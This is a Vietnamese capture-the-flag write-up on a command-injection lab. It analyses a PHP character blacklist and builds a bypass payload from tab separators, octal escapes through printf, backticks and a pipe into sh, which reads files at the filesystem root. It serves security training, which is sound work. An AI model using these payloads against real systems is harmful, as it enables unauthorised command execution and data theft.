# Phân tích Whitebox:

| **Dòng lệnh** | **Phạm vi ký tự (Hex)** | **Ký tự cụ thể** |
| -- | -- | -- |
| `preg_replace("/[\x{20}-\x{29}\x{2f}]/","",$input)` | `\x{20}` → `\x{29}` và`\x{2f}` | Khoảng trắng ( ) &#10;Dấu chấm than (`!`) &#10;Dấu ngoặc kép (`"`) &#10;Dấu thăng (`#`) &#10;Dấu đô la (`$`) &#10;Dấu phần trăm (`%`) &#10;Dấu và (`&`) &#10;Dấu nháy đơn (`'`) &#10;Dấu ngoặc đơn mở/đóng (`(`, `)`) &#10;Dấu gạch chéo (`/`) |
| `preg_replace("/[\x{3b}-\x{40}]/","",$input)` | `\x{3b}` → `\x{40}` | Dấu chấm phẩy (`;`) &#10;Dấu nhỏ hơn (`<`) &#10;Dấu bằng (`=`) &#10;Dấu lớn hơn (`>`)&#10;Dấu hỏi (`?`) &#10;Dấu @ (`@`) |

* Vẫn còn dấu `` ` `` chưa được lọc
* Dùng `<tab>` thay vì `<space>` vì space bị chặn
* Dùng được dấu `*` để cat `*`
* Dấu `|` không bị chặn → có thể dùng để chạy lệnh liên tiếp
* Tận dụng các cơ chế biên dịch (Hex/Octal)

# Build Payload:

* Do hầu hết đều bị chặn nên chỉ còn một cách đó là tận dụng cơ chế biên dịch Octal của unix command. Lệnh mà ta cần đó là `cat /*`

| Octal | Ký tự | Giải thích |
| -- | -- | -- |
| `\143` | `c` | Chữ cái `c` |
| `\141` | `a` | Chữ cái `a` |
| `\164` | `t` | Chữ cái `t` |
| `\040` | (khoảng trắng) | Dấu cách |
| `\057` | `/` | Dấu gạch chéo |
| `\052` | `*` | Dấu sao |

→ Từ đó em build ra được lệnh và đã đọc được flag thành công khi ở trong docker: 

```bash
root@18d43a179255:/var/www/html# `printf \\\143\\\141\\\164\\\040\\\057\\\052`
🥷: You are master of Command Injection now! CBJS{FAKE_FLAG_FAKE_FLAG}
```

Nhưng trên payload trên Caido chỉ có 2 dấu `\\` là vì ở backend đã có sẵn hàm `addslashes()` tự động thêm 1 dấu `\` khi thấy `\`.

→ Vậy pipeline xây payload là:

1. dùng: `printf \\143\\141\\164\\040\\057\\052` → `cat /*`
2. thay `<space>` → `<tab>`
3. bọc đọc cặp backtick `` ` ` `` để thực thi bên trong `"Hello $username"` -> `` "Hello `id`" ``
4. gắn `| sh` để execute `` ` ` `` bên trong `" "` (mặc định nó sẽ không execute nếu không yêu cầu thực thi

![](https://uploads.linear.app/b471c4ef-0f5a-4e1c-b641-7b7285ddb9ac/5400a4e3-63c7-4e21-acf0-b1fe7df011bf/cdef130b-b034-42db-bc1e-e0525bf06cbb?signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXRoIjoiL2I0NzFjNGVmLTBmNWEtNGUxYy1iNjQxLTdiNzI4NWRkYjlhYy81NDAwYTRlMy02M2M3LTRlMjEtYWNmMC1iMWZlN2RmMDExYmYvY2RlZjEzMGItYjAzNC00MmRiLWJjMWUtZTA1MjViZjA2Y2JiIiwiaWF0IjoxNzg2OTUxMDQzLCJleHAiOjE3ODY5OTQyNDN9.Cm4HlqaOUzXjQpyK8rOUer1whAZVh2OwlU6P1IvAmxQ)

![](https://uploads.linear.app/b471c4ef-0f5a-4e1c-b641-7b7285ddb9ac/1cfba3a8-c2a4-43b4-97b0-54fa82374077/5b6df5b6-2706-472d-979a-6828838193b2?signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXRoIjoiL2I0NzFjNGVmLTBmNWEtNGUxYy1iNjQxLTdiNzI4NWRkYjlhYy8xY2ZiYTNhOC1jMmE0LTQzYjQtOTdiMC01NGZhODIzNzQwNzcvNWI2ZGY1YjYtMjcwNi00NzJkLTk3OWEtNjgyODgzODE5M2IyIiwiaWF0IjoxNzg2OTUxMDQzLCJleHAiOjE3ODY5OTQyNDN9.cMelDIf_oJU17eATmEGXbxyLzAShimeKvSi4YVrHxFI)

→ Vậy payload cuối cùng sẽ là:

```bash
`printf<TAB>\\143\\141\\164<TAB>\\040\\057\\052<TAB>|<TAB>sh`
```

![](https://uploads.linear.app/b471c4ef-0f5a-4e1c-b641-7b7285ddb9ac/35822979-181f-4225-befe-afc0c0e029aa/27092ce4-a5a9-40e1-bc94-1924decd7e44?signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXRoIjoiL2I0NzFjNGVmLTBmNWEtNGUxYy1iNjQxLTdiNzI4NWRkYjlhYy8zNTgyMjk3OS0xODFmLTQyMjUtYmVmZS1hZmMwYzBlMDI5YWEvMjcwOTJjZTQtYTVhOS00MGUxLWJjOTQtMTkyNGRlY2Q3ZTQ0IiwiaWF0IjoxNzg2OTUxMDQzLCJleHAiOjE3ODY5OTQyNDN9.QVBNS3jwWReZ5zHsx3TyIo5J5nxUwce0uPL_YElhCG0)